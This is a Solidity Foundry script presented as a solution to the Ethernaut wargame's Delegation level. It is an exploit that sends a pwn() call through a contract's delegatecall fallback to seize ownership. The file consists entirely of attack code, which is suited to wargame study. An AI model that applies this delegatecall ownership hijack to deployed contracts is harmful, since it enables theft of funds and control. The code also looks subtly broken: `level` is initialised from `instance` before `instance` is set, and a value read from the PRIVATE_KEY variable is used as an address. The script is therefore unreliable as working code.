// SPDX-License-Identifier: CC-BY-4.0
// bt3gl's solution to ethernaut

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {Delegation} from "src/06/Delegation.sol";


contract Exploit is Script {

        Delegation level = Delegation(instance);   
        address instance = vm.envAddress("INSTANCE_LEVEL6");
        address hacker = vm.envAddress("PRIVATE_KEY");   
        
        function run() external {

            vm.startBroadcast(hacker);
            (bool success, ) = address(level).call(
                abi.encodeWithSignature("pwn()")
            );
            require(success);
            vm.stopBroadcast();
    }
}